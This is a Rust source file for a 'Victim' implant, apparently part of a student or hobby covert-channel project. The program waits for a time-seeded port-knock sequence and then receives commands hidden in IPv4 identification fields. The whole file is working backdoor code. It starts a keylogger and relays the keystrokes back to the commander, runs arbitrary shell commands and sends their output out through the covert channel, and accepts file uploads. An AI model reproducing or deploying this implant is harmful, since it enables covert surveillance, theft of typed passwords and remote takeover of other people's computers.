use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::fs::File;
use std::io::{self, Write};

use pnet::datalink::{self, Channel, NetworkInterface, DataLinkReceiver};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;

mod keylogger;
mod covert; 

// Command Codes for Covert IPID Channel
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF: u8            = 0x41;

pub struct SimpleRng { state: u64 }
impl SimpleRng {
    pub fn new(seed: u64) -> Self { Self { state: seed } }
    pub fn next_u32(&mut self) -> u32 {
        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1);
        (self.state >> 32) as u32
    }
    pub fn gen_port(&mut self) -> u16 {
        1024 + (self.next_u32() % (65535 - 1024)) as u16
    }
}

pub fn generate_seed(ip: &Ipv4Addr) -> u64 {
    let ip_u32: u32 = (*ip).into();
    let time_step = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() / 60; 
    (ip_u32 as u64) ^ time_step
}

struct Victim {
    interface: NetworkInterface,
    local_ip: Ipv4Addr,
    keylogger_active: Arc<AtomicBool>,
}

impl Victim {
    fn new() -> Self {
        let (interface, local_ip) = Self::find_active_interface()
            .expect("No active network interface found");
        Self {
            interface,
            local_ip,
            keylogger_active: Arc::new(AtomicBool::new(false)),
        }
    }

    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
        datalink::interfaces().into_iter().find(|iface| {
            iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty()
        }).and_then(|iface| {
            iface.ips.iter().find_map(|ip| {
                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
            })
        })
    }

    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
        let (_, mut rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(_tx, rx)) => (_tx, rx),
            _ => panic!("Error opening channel"),
        };

        println!("[*] Monitoring {} for knock sequence...", self.local_ip);
        let mut knock_idx = 0;

        loop {
            let current_seed = generate_seed(&self.local_ip);
            let mut rng = SimpleRng::new(current_seed);
            let sequence = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
            
            // Port swap: Commander TX is Victim RX
            let c2_tx_port = rng.gen_port(); 
            let c2_rx_port = rng.gen_port(); 

            if let Ok(packet) = rx.next() {
                if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
                    if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                        let dest_port = tcp_pkt.get_destination();

                        if dest_port == sequence[knock_idx] {
                            knock_idx += 1;
                            println!("[*] Knock sequence: {}/3 (Port: {})", knock_idx, dest_port);
                            
                            if knock_idx == sequence.len() {
                                println!("[+] Connection Authenticated.");
                                println!("[*] Listening for Commands on Port: {}", c2_tx_port);
                                return (ip_pkt.get_source(), c2_rx_port, c2_tx_port);
                            }
                        } else if knock_idx > 0 && dest_port != sequence[knock_idx-1] {
                            knock_idx = 0; // Reset on mismatch
                        }
                    }
                }
            }
        }
    }

    pub fn run(&mut self) {
        let (commander_ip, tx_port, rx_port) = self.wait_for_commander();
        
        let (transmitter, rx) = covert::CovertChannel::new(
            &self.interface, commander_ip, self.local_ip, tx_port, rx_port
        );
        
        println!("[*] Covert channel active. Entering command loop...");
        self.process_commands(rx, transmitter);
    }

    fn process_commands(&mut self, mut rx: Box<dyn DataLinkReceiver>, mut transmitter: covert::CovertChannel) {
        let mut string_buffer = String::new();
        let mut binary_mode = false;
        let mut file_data = Vec::new();

        let (key_tx, key_rx) = mpsc::channel::<u8>();

        loop {
            // 1. Relay captured keys to Commander
            while let Ok(byte) = key_rx.try_recv() {
                transmitter.send_byte(byte);
                thread::sleep(Duration::from_micros(500));
            }

            // 2. Listen for Command Packets
            if let Ok(packet) = rx.next() {
                if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
                    if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                        let dest_port = tcp_pkt.get_destination();
                        
                        // DEBUG: Match destination port first
                        if dest_port == transmitter.config.listen_port {
                            let byte = (ip_pkt.get_identification() & 0x00FF) as u8;
                            let src = ip_pkt.get_source();
                            
                            // PRINT EVERY PACKET RECEIVED ON THE COMMAND PORT
                            println!("[DEBUG] Packet Recv: Src={}, Port={}, ID=0x{:02X}", src, dest_port, byte);

                            // RELAXED SECURITY: Only check IP if you are sure it won't change via NAT/VPN
                            // if src == transmitter.config.target_ip {
                                match byte {
                                    CMD_START_LOGGER => {
                                        if !self.keylogger_active.load(Ordering::SeqCst) {
                                            self.keylogger_active.store(true, Ordering::SeqCst);
                                            let flag = self.keylogger_active.clone();
                                            let tx_clone = key_tx.clone();
                                            thread::spawn(move || { 
                                                let _ = keylogger::run_with_flag(flag, tx_clone); 
                                            });
                                            println!("[+] COMMAND: Keylogger Started.");
                                        }
                                    },
                                    CMD_STOP_LOGGER => {
                                        self.keylogger_active.store(false, Ordering::SeqCst);
                                        println!("[-] COMMAND: Keylogger Stopped.");
                                    },
                                    CMD_UNINSTALL => {
                                        println!("[!] COMMAND: Uninstalling/Exiting.");
                                        std::process::exit(0);
                                    },
                                    CMD_START_TRANSFER => { 
                                        println!("[*] COMMAND: Switching to Binary Mode.");
                                        binary_mode = true; 
                                        file_data.clear(); 
                                    },
                                    CMD_EOF => {
                                        if binary_mode { 
                                            self.save_file(&file_data); 
                                            binary_mode = false; 
                                            println!("[*] File Transfer Complete.");
                                        }
                                    },
                                    b'\n' => {
                                        if !binary_mode {
                                            println!("[*] COMMAND: Executing Shell -> {}", string_buffer);
                                            self.execute_shell(&string_buffer, &mut transmitter);
                                            string_buffer.clear();
                                        }
                                    },
                                    _ => {
                                        if binary_mode { 
                                            file_data.push(byte); 
                                        } else if byte >= 32 && byte <= 126 {
                                            string_buffer.push(byte as char);
                                        }
                                    }
                                }
                            // }
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(1));
        }
    }

    fn execute_shell(&self, cmd: &str, transmitter: &mut covert::CovertChannel) {
        if let Ok(out) = std::process::Command::new("sh").arg("-c").arg(cmd).output() {
            for b in out.stdout {
                transmitter.send_byte(b);
                thread::sleep(Duration::from_micros(500));
            }
        }
    }

    fn save_file(&self, data: &[u8]) {
        if let Ok(mut f) = File::create("received_bin") {
            let _ = f.write_all(data).ok();
        }
    }
}

fn main() {
    println!("=== Victim Client Initializing ===");
    Victim::new().run();
}
